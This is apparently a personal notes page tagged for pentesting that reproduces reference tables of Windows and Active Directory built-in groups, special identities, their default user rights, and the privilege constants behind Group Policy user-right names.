---
title: Windows Group Privileges
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - windows
  - privilege
---
# Windows Group Privileges


## Groups, user rights and permissions in Windows and Active Directory

### Default groups and special identities in an Active Directory 

Table of all built-in users, default groups and special identities in an Active Directory ([original source](https://ss64.com/nt/syntax-security_groups.html))

|Default Group|**Default User** or Session owner|Special Identity|Description|
|---|---|---|---|
|Access Control Assistance Operators|||Remotely query authorization attributes and permissions for resources on the computer.  <br>BuiltIn Local.  <br>Default User Rights: None|
|Account Operators|||Grants limited account creation privileges to a user. Members of this group can create and modify most types of accounts, including those of users, local groups, and global groups, and members can log in locally to domain controllers.  <br>  <br>Members of the Account Operators group cannot manage the Administrator user account, the user accounts of administrators, or the Administrators, Server Operators, Account Operators, Backup Operators, or Print Operators groups. Members of this group cannot modify user rights.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): Allow log on locally: SeInteractiveLogonRight|
||Administrator||A user account for the system administrator. This account is the first account created during Operating System installation. The account cannot be deleted or locked out. It is a member of the Administrators group and cannot be removed from that group.  <br>[](https://docs.microsoft.com/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-admins)|
|Administrators|||A built-in group . Grants complete and unrestricted access to the computer, or if the computer is promoted to a domain controller, members have unrestricted access to the domain.  <br>  <br>This group cannot be renamed, deleted, or moved. This built-in group controls access to all the domain controllers in its domain, and it can change the membership of all administrative groups. Membership can be modified by members of the following groups: the default service Administrators, Domain Admins in the domain, or Enterprise Admins.  <br>  <br>The group is the default owner of any object that is created by a member of the group.  <br>[Default User Rights for Administrators](https://docs.microsoft.com/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-admins)|
|Allowed RODC Password Replication Group|||Manage a RODC password replication policy. The _Denied RODC Password Replication Group_ group contains a variety of high-privilege accounts and security groups. The Denied RODC Password Replication group supersedes the Allowed RODC Password Replication group.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|||Anonymous Logon|A user who has logged on anonymously. This identity allows anonymous access to resources, such as a web page that is published on corporate servers.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|||Authenticated Users|A group that includes all users whose identities were authenticated when they logged on. Membership is controlled by the Operating System. This identity allows access to shared resources within the domain, such as files in a shared folder that should be accessible to all the workers in the organization.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html):  <br>Access this computer from the network: SeNetworkLogonRight  <br>Add workstations to domain: SeMachineAccountPrivilege (Often removed in environments that have an IT administrator.)  <br>Bypass traverse checking: SeChangeNotifyPrivilege|
|Backup Operators|||A built-in group. By default, the group has no members. Backup Operators can back up and restore all files on a computer, regardless of the permissions that protect those files. Backup Operators also can log on to the computer and shut it down.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html):  <br>Allow log on locally: SeInteractiveLogonRight  <br>Back up files and directories: SeBackupPrivilege  <br>Log on as a batch job: SeBatchLogonRight  <br>Restore files and directories: SeRestorePrivilege  <br>Shut down the system: SeShutdownPrivilege|
|||Batch|Any user or process that accesses the system as a batch job (or through the batch queue) has the Batch identity. This identity allows batch jobs to run scheduled tasks, such as a nightly cleanup jobMembership is controlled by the Operating System.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|Certificate Service DCOM Access|||Members of this group are allowed to connect to certification authorities in the enterprise.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|Cert Publishers|||A global group that includes all computers that are running an enterprise certificate authority. Cert Publishers are authorized to publish certificates for User objects in Active Directory.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|Cert Server Admins|||Certificate Authority Administrators - authorized to administer certificates for User objects in Active Directory. (Domain Local)|
|Cert Requesters|||Members can request certificates (Domain Local)|
|Cloneable Domain Controllers|||Members of the Cloneable Domain Controllers group that are domain controllers may be cloned. Default User Rights: None|
|Cryptographic Operators|||Members of this group are authorized to perform cryptographic operations. This security group was added in Windows Vista Service Pack 1 (SP1) to configure Windows Firewall for IPsec in Common Criteria mode. Default User Rights: None|
|||Creator Group|The person who created the file or the directory is a member of this special identity group. Windows Server Operating Systems use this identity to automatically grant access permissions to the creator of a file or directory. A placeholder security identifier (SID) is created in an inheritable access control entry (ACE). When the ACE is inherited, the system replaces this SID with the SID for the primary group of the object’s current owner.  <br>The primary group is used only by the Portable Operating System Interface for UNIX (POSIX) subsystem.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|||Creator Owner|The person who created the file or the directory is a member of this special identity group. Windows Server Operating Systems use this identity to automatically grant access permissions to the creator of a file or directory. A placeholder SID is created in an inheritable ACE. When the ACE is inherited, the system replaces this SID with the SID for the object’s current owner.|
|Denied RODC Password Replication Group|||Members of the Denied RODC Password Replication group cannot have their passwords replicated to any Read-only domain controller. The purpose of this security group is to manage a RODC password replication policy. This group contains a variety of high-privilege accounts and security groups.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|Device Owners|||This group is not currently used in Windows.  <br>  <br>Default [User Rights](https://ss64.com/nt/ntrights.html):  <br>Allow log on locally: SeInteractiveLogonRight  <br>Access this computer from the network: SeNetworkLogonRight  <br>Bypass traverse checking: SeChangeNotifyPrivilege  <br>Change the time zone: SeTimeZonePrivilege|
|||Dialup|Any user who accesses the system through a dial-up connection has the Dial-Up identity. This identity distinguishes dial-up users from other types of authenticated users.|
|||Digest Authentication|Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|Distributed COM Users|||Members of the Distributed COM Users group are allowed to launch, activate, and use Distributed COM objects on the computer.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|DnsAdmins (installed with DNS)|||Members of this group have administrative access to the DNS Server service. The default permissions are as follows: Allow: Read, Write, Create All Child objects, Delete Child objects, Special Permissions. This group has no default members.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|DnsUpdateProxy (installed with DNS)|||Members of this group are DNS clients that can perform dynamic updates on behalf of other clients, such as DHCP servers. This group has no default members. Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|Domain Admins|||A global group whose members are authorized to administer the domain. By default, the Domain Admins group is a member of the Administrators group on all computers that have joined a domain, including the domain controllers. Domain Admins is the default owner of any object that is created in the domain’s Active Directory by any member of the group. If members of the group create other objects, such as files, the default owner is the Administrators group.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): as Administrators|
|Domain Computers|||A global group that includes all computers that have joined the domain, excluding domain controllers. Default User Rights: None|
|Domain Controllers|||A global group that includes all domain controllers in the domain. New domain controllers are added to this group automatically. Default Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|Domain Guests|||A global group that, by default, has only one member, the domain’s built-in Guest account.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): See 'Guests'|
|Domain Users|||A global group that, by default, includes all user accounts in a domain. When you create a user account in a domain, it is added to this group automatically.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): See 'Users'|
|Enterprise Admins|||A group that exists only in the root domain of an Active Directory forest of domains. It is a universal group if the domain is in native mode, a global group if the domain is in mixed mode. The group is authorized to make forest-wide changes in Active Directory, such as adding child domains. By default, the only member of the group is the Administrator account for the forest root domain.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html):  <br>See Administrators  <br>See Denied RODC Password Replication Group|
|Enterprise Key Admins|||Members of this group can perform administrative actions on key objects within the forest. The Enterprise Key Admins group was introduced in Windows Server 2016. Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|Enterprise Read-Only Domain Controllers|||Members of this group are Read-Only Domain Controllers in the enterprise. Except for account passwords, a Read-only domain controller holds all the Active Directory objects and attributes that a writable domain controller holds.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|||Enterprise Domain Controllers|A group that includes all domain controllers an Active Directory directory service forest of domains. Membership is controlled by the Operating System.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html):  <br>Access this computer from the network: SeNetworkLogonRight  <br>Allow log on locally: SeInteractiveLogonRight|
|Event Log Readers|||Members of this group can read event logs from local computers. The group is created when the server is promoted to a domain controller. Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|||Everyone|All interactive, network, dial-up, and authenticated users are members of the Everyone group. This special identity group gives wide access to system resources. Whenever a user logs on to the network, the user is automatically added to the Everyone group. On computers running Windows 2000 and earlier, the Everyone group included the Anonymous Logon group as a default member, but as of Windows Server 2003, the Everyone group contains only Authenticated Users and Guest; and it no longer includes Anonymous Logon by default (although this can be changed). Membership is controlled by the Operating System.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html):  <br>Access this computer from the network: SeNetworkLogonRight  <br>Act as part of the Operating System: SeTcbPrivilege  <br>Bypass traverse checking: SeChangeNotifyPrivilege|
|Group Policy Creators Owners|||A global group that is authorized to create new Group Policy objects in Active Directory. By default, the only member of the group is Administrator. The default owner of a new Group Policy object is usually the user who created it. If the user is a member of Administrators or Domain Admins, all objects that are created by the user are owned by the group. Owners have full control of the objects they own. Default [User Rights](https://ss64.com/nt/ntrights.html): See 'Denied RODC Password Replication Group'.|
||Guest||A user account for people who do not have individual accounts. This user account does not require a password. By default, the Guest account is disabled.|
|Guests|||A built-in group. By default, the only member is the Guest account. The Guests group allows occasional or one-time users to log on with limited privileges to a computer’s built-in Guest account. When a member of the Guests group signs out, the entire profile is deleted. This includes everything that is stored in the %userprofile% directory, including the user’s registry hive information, custom desktop icons, and other user-specific settings. This implies that a guest must use a temporary profile to sign in to the system.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|Hyper-V Administrators|||Members of the Hyper-V Administrators group have complete and unrestricted access to all the features in Hyper-V. Adding members to this group helps reduce the number of members required in the Administrators group, and further separates access.  <br>Introduced in Windows Server 2012. Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|IIS_IUSRS|||IIS_IUSRS is a built-in group that is used by Internet Information Services beginning with IIS 7.0. A built-in account and group are guaranteed by the Operating System to always have a unique SID. IIS 7.0 replaces the IUSR_MachineName account and the IIS_WPG group with the IIS_IUSRS group to ensure that the actual names that are used by the new account and group will never be localized.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|Incoming Forest Trust Builders|||Members of the Incoming Forest Trust Builders group can create incoming, one-way trusts to this forest. Active Directory provides security across multiple domains or forests through domain and forest trust relationships. This group cannot be renamed, deleted, or moved. Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|Key Admins|||Members of this group can perform administrative actions on key objects within the domain.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|||Interactive|Any user who is logged on to the local system has the Interactive identity. This identity allows only local users to access a resource. Whenever a user accesses a given resource on the computer to which they are currently logged on, the user is automatically added to the Interactive group. Membership is controlled by the Operating System.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
||KRBTGT||A service account that is used by the Key Distribution Center (KDC) service.|
|||Local Service|The Local Service account is similar to an Authenticated User account. The Local Service account has the same level of access to resources and objects as members of the Users group. This limited access helps safeguard your system if individual services or processes are compromised. Services that run as the Local Service account access network resources as a null session with anonymous credentials. The name of the account is NT AUTHORITY\LocalService. This account does not have a password.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html):  <br>Adjust memory quotas for a process: SeIncreaseQuotaPrivilege  <br>Bypass traverse checking: SeChangeNotifyPrivilege  <br>Change the system time: SeSystemtimePrivilege  <br>Change the time zone: SeTimeZonePrivilege  <br>Create global objects: SeCreateGlobalPrivilege  <br>Generate security audits: SeAuditPrivilege  <br>Impersonate a client after authentication: SeImpersonatePrivilege  <br>Replace a process level token: SeAssignPrimaryTokenPrivilege|
|||Local System|This is a service account that is used by the Operating System. The LocalSystem account is a powerful account that has full access to the system and acts as the computer on the network. If a service logs on to the LocalSystem account on a domain controller, that service has access to the entire domain. Some services are configured by default to log on to the LocalSystem account. Do not change the default service setting. The name of the account is LocalSystem. This account does not have a password.  <br>Default User Rights: None|
|||Network|This group implicitly includes all users who are logged on through a network connection. Any user who accesses the system through a network has the Network identity. This identity allows only remote users to access a resource. Whenever a user accesses a given resource over the network, the user is automatically added to the Network group. Membership is controlled by the Operating System.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|||Network Service|The Network Service account is similar to an Authenticated User account. The Network Service account has the same level of access to resources and objects as members of the Users group. This limited access helps safeguard your system if individual services or processes are compromised. Services that run as the Network Service account access network resources by using the credentials of the computer account. The name of the account is NT AUTHORITY\NetworkService. This account does not have a password.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html):  <br>Adjust memory quotas for a process: SeIncreaseQuotaPrivilege  <br>Bypass traverse checking: SeChangeNotifyPrivilege  <br>Create global objects: SeCreateGlobalPrivilege  <br>Generate security audits: SeAuditPrivilege  <br>Impersonate a client after authentication: SeImpersonatePrivilege  <br>Restore files and directories: SeRestorePrivilege  <br>Replace a process level token: SeAssignPrimaryTokenPrivilege|
|Network Configuration Operators|||Members of this group can make changes to TCP/IP settings, Rename/Enable/disable LAN connections,Delete/rename remote access connections, enter the PIN unblock key (PUK) for mobile broadband devices that support a SIM card and renew and release TCP/IP addresses on domain controllers in the domain. This group has no default members.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|||NTLM Authentication|Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|||Other Organization|This group implicitly includes all users who are logged on to the system through a dial-up connection. Membership is controlled by the Operating System. Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|Performance Monitor Users|||Members of this group can monitor performance counters on domain controllers in the domain, locally and from remote clients without being a member of the Administrators or Performance Log Users groups.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|Performance Log Users|||Members of this group can manage performance counters, logs and alerts on domain controllers in the domain, locally and from remote clients without being a member of the Administrators group.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): Log on as a batch job: SeBatchLogonRight|
|Power Users|||By default, members of this group have no more user rights or permissions than a standard user account.  <br>The Power Users group did once grant users specific admin rights and permissions in previous versions of Windows.|
|Pre-Windows 2000 Compatible Access|||A backward compatibility group which allows read access on all users and groups in the domain. By default, the special identity Everyone is a member of this group. Add users to this group only if they are running Windows NT 4.0 or earlier.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html):  <br>Access this computer from the network: SeNetworkLogonRight  <br>Bypass traverse checking: SeChangeNotifyPrivilege|
|||Principal Self  <br>or  <br>Self|This identify is a placeholder in an ACE on a user, group, or computer object in Active Directory. When you grant permissions to Principal Self, you grant them to the security principal that is represented by the object. During an access check, the Operating System replaces the SID for Principal Self with the SID for the security principal that is represented by the object.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|Print Operators|||A built-in group that exists only on domain controllers. By default, the only member is the Domain Users group. Print Operators can manage printers and document queues. They can also manage Active Directory printer objects in the domain. Members of this group can locally sign in to and shut down domain controllers in the domain.  <br>Because members of this group can load and unload device drivers on all domain controllers in the domain, add users with caution. This group cannot be renamed, deleted, or moved.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html):  <br>Allow log on locally: SeInteractiveLogonRight  <br>Load and unload device drivers: SeLoadDriverPrivilege  <br>Shut down the system: SeShutdownPrivilege|
|Protected Users|||Members of the Protected Users group are afforded additional protection against the compromise of credentials during authentication processes. This security group is designed as part of a strategy to effectively protect and manage credentials within the enterprise. Members of this group automatically have non-configurable protection applied to their accounts. Membership in the Protected Users group is meant to be restrictive and proactively secure by default. The only method to modify the protection for an account is to remove the account from the security group. This group was introduced in Windows Server 2012 R2.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|RAS and IAS Servers|||Servers in this group are permitted access to the remote access properties of users. A domain local group . By default, this group has no members. Computers that are running the Routing and Remote Access service are added to the group automatically. Members of this group have access to certain properties of User objects, such as Read Account Restrictions, Read Logon Information, and Read Remote Access Information. Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|RDS Endpoint Servers|||Servers that are members in the RDS Endpoint Servers group can run virtual machines and host sessions where user RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. Session Host servers and RD Virtualization Host servers used in the deployment need to be in this group.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|RDS Management Servers|||Servers that are members in the RDS Management Servers group can be used to perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The servers running the RDS Central Management service must be included in this group. Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|RDS Remote Access Servers|||Servers in the RDS Remote Access Servers group provide users with access to RemoteApp programs and personal virtual desktops. In Internet facing deployments, these servers are typically deployed in an edge network. This group needs to be populated on servers running RD Connection Broker. RD Gateway servers and RD Web Access servers that are used in the deployment need to be in this group. Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|Read-Only Domain Controllers|||This group is comprised of the Read-only domain controllers in the domain. A Read-only domain controller makes it possible for organizations to easily deploy a domain controller in scenarios where physical security cannot be guaranteed, such as branch office locations, or in scenarios where local storage of all domain passwords is considered a primary threat, such as in an extranet or in an application-facing role. Default User Rights See 'Denied RODC Password Replication Group'.|
|Remote Desktop Users|||The Remote Desktop Users group on an RD Session Host server is used to grant users and groups permissions to remotely connect to an RD Session Host server. This group cannot be renamed, deleted, or moved. It appears as a SID until the domain controller is made the primary domain controller and it holds the operations master role (also known as flexible single master operations or FSMO).  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|||Remote Interactive Logon|This identity represents all users who are currently logged on to a computer by using a Remote Desktop connection. This group is a subset of the Interactive group. Access tokens that contain the Remote Interactive Logon SID also contain the Interactive SID.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|Remote Management Users|||Members of the Remote Management Users group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user. The Remote Management Users group is generally used to allow users to manage servers through the Server Manager console, whereas the WinRMRemoteWMIUsers_ group is allows remotely running Windows PowerShell commands.  <br>Default User Rights: None|
|Replicator|||Computers that are members of the Replicator group support file replication in a domain. Windows Server Operating Systems use the File Replication service (FRS) to replicate system policies and logon scripts stored in the System Volume (SYSVOL).  <br>  <br>The DFS Replication service is a replacement for FRS, and it can be used to replicate the contents of a SYSVOL shared resource, DFS folders, and other custom (non-SYSVOL) data. You should migrate all non-SYSVOL FRS replica sets to DFS Replication.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|||Restricted|Users and computers with restricted capabilities have the Restricted identity. This identity group is used by a process that is running in a restricted security context, such as running an application with the RunAs service. When code runs at the Restricted security level, the Restricted SID is added to the user’s access token.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|||SChannel Authentication|Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|Schema Admins|||A group that exists only in the root domain of an Active Directory forest of domains. It is a universal group if the domain is in native mode , a global group if the domain is in mixed mode . The group is authorized to make schema  changes in Active Directory. By default, the only member of the group is the Administrator account for the forest root domain. Because this group has significant power in the forest, add users with caution.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): See 'Denied RODC Password Replication Group'.|
|Server Operators|||A built-in group that exists only on domain controllers. By default, the group has no members. Server Operators can log on to a server interactively; create and delete network shares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html):  <br>Allow log on locally: SeInteractiveLogonRight  <br>Back up files and directories: SeBackupPrivilege  <br>Change the system time: SeSystemTimePrivilege  <br>Change the time zone: SeTimeZonePrivilege  <br>Force shutdown from a remote system: SeRemoteShutdownPrivilege  <br>Restore files and directories SeRestorePrivilege  <br>Shut down the system: SeShutdownPrivilege|
|||Service|Any service that accesses the system has the Service identity. This identity group includes all security principals that are signed in as a service. This identity grants access to processes that are being run by Windows Server services. Membership is controlled by the Operating System.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html):  <br>Create global objects: SeCreateGlobalPrivilege  <br>Impersonate a client after authentication: SeImpersonatePrivilege|
|Storage Replica Administrators|||Members of this group have complete and unrestricted access to all features of Storage Replica.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|System Managed Accounts Group|||Members of this group are managed by the system.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|Terminal Server License Servers|||Members of the Terminal Server License Servers group can update user accounts in Active Directory with information about license issuance. This is used to track and report TS Per User CAL usage. A TS Per User CAL gives one user the right to access a Terminal Server from an unlimited number of client computers or devices. This group appears as a SID until the domain controller is made the primary domain controller and it holds the operations master role (also known as flexible single master operations or FSMO).  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|||Terminal Server Users|Any user accessing the system through Terminal Services has the Terminal Server User identity. This identity allows users to access Terminal Server applications and to perform other necessary tasks with Terminal Server services. Membership is controlled by the Operating System.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|||This Organization|Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|Users|||A built-in group. After the initial installation of the Operating System, the only member is the Authenticated Users group. When a computer joins a domain, the Domain Users group is added to the Users group on the computer. Users can perform tasks such as running applications, using local and network printers, shutting down the computer, and locking the computer. Users can install applications that only they are allowed to use if the installation program of the application supports per-user installation.  <br>This group cannot be renamed, deleted, or moved.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|Windows Authorization Access Group|||Members of this group have access to the computed token GroupsGlobalAndUniversal attribute on User objects. Some applications have features that read the token-groups-global-and-universal (TGGAU) attribute on user account objects or on computer account objects in Active Directory Domain Services.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|
|||Window Manager\Window Manager Group|Default [User Rights](https://ss64.com/nt/ntrights.html):  <br>Bypass traverse checking: SeChangeNotifyPrivilege  <br>Increase a process working set: SeIncreaseWorkingSetPrivilege|
|WinRMRemoteWMIUsers_|||In Windows 8 and in Windows Server 2012, a Share tab was added to the Advanced Security Settings user interface. This tab displays the security properties of a remote file share. To view this information, you must have the following permissions and memberships, as appropriate for the version of Windows Server that the file server is running.  <br>  <br>The WinRMRemoteWMIUsers_ group allows running PowerShell commands remotely whereas the 'Remote Management Users' group is generally used to allow users to manage servers by using the Server Manager console. This security group was introduced in Windows Server 2012.  <br>Default [User Rights](https://ss64.com/nt/ntrights.html): None|

### User rights and Privileges

| **Name of Constant**              | **User Right in Group Policy**                                                                                                                                                                   |
| --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| SeTrustedCredManAccessPrivilege   | [Access Credential Manager as a trusted caller](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_2)                   |
| SeNetworkLogonRight               | [Access this computer from the network](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_1)                           |
| SeTcbPrivilege                    | [Act as part of the operating system](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_3)                             |
| SeMachineAccountPrivilege         | [Add workstations to domain](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_4)                                      |
| SeIncreaseQuotaPrivilege          | [Adjust memory quotas for a process](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_5)                              |
| SeInteractiveLogonRight           | [Allow log on locally](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_6)                                            |
| SeRemoteInteractiveLogonRight     | [Allow log on through Terminal Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_7)                          |
| SeBackupPrivilege                 | [Back up files and directories](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_8)                                   |
| SeChangeNotifyPrivilege           | [Bypass traverse checking](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_9)                                        |
| SeSystemtimePrivilege             | [Change the system time](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_10)                                         |
| SeTimeZonePrivilege               | [Change the time zone](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_11)                                           |
| SeCreatePagefilePrivilege         | [Create a pagefile](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_12)                                              |
| SeCreateTokenPrivilege            | [Create a token object](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_13)                                          |
| SeCreateGlobalPrivilege           | [Create global objects](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_14)                                          |
| SeCreatePermanentPrivilege        | [Create permanent shared objects](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_15)                                |
| SeCreateSymbolicLinkPrivilege     | [Create symbolic links](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_16)                                          |
| SeDebugPrivilege                  | [Debug programs](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_17)                                                 |
| SeDenyNetworkLogonRight           | [Deny access to this computer from the network](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_18)                  |
| SeDenyBatchLogonRight             | [Deny log on as a batch job](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_18a)                                    |
| SeDenyServiceLogonRight           | [Deny log on as a service](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_19)                                       |
| SeDenyInteractiveLogonRight       | [Deny log on locally](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_20)                                            |
| SeDenyRemoteInteractiveLogonRight | [Deny log on through Terminal Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_21)                          |
| SeEnableDelegationPrivilege       | [Enable computer and user accounts to be trusted for delegation](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_22) |
| SeRemoteShutdownPrivilege         | [Force shutdown from a remote system](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_23)                            |
| SeAuditPrivilege                  | [Generate security audits](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_24)                                       |
| SeImpersonatePrivilege            | [Impersonate a client after authentication](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_25)                      |
| SeIncreaseWorkingSetPrivilege     | [Increase a process working set](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_26)                                 |
| SeIncreaseBasePriorityPrivilege   | [Increase scheduling priority](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_27)                                   |
| SeLoadDriverPrivilege             | [Load and unload device drivers](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_28)                                 |
| SeLockMemoryPrivilege             | [Lock pages in memory](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_29)                                           |
| SeBatchLogonRight                 | [Log on as a batch job](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_30)                                          |
| SeServiceLogonRight               | [Log on as a service](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_31)                                            |
| SeSecurityPrivilege               | [Manage auditing and security log](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_32)                               |
| SeRelabelPrivilege                | [Modify an object label](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_33)                                         |
| SeSystemEnvironmentPrivilege      | [Modify firmware environment values](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_34)                             |
| SeManageVolumePrivilege           | [Perform volume maintenance tasks](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_35)                               |
| SeProfileSingleProcessPrivilege   | [Profile single process](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_36)                                         |
| SeSystemProfilePrivilege          | [Profile system performance](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_37)                                     |
